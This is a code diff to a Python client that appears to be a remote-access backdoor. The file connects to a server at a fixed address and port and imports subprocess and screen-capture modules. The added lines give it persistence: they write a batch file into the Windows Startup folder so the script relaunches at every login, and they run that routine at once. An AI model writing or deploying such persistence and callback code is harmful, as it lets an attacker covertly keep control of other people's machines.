@@ -19,10 +19,25 @@ import subprocess
 import platform
 import os
 from PIL import ImageGrab
+import getpass
+
 
 HOST_IP = "192.168.1.23"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
+USER_NAME = getpass.getuser()
+
+
+# https://stackoverflow.com/questions/4438020/how-to-start-a-python-file-while-windows-starts
+def add_to_startup():
+    file_path = os.path.dirname(os.path.realpath(__file__))
+    print(f"add_to_startup file: {file_path}")
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    print(f"add_to_startup bat: {bat_path}")
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" "%s"' % file_path)
+
+add_to_startup()
 
 print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
 while True:
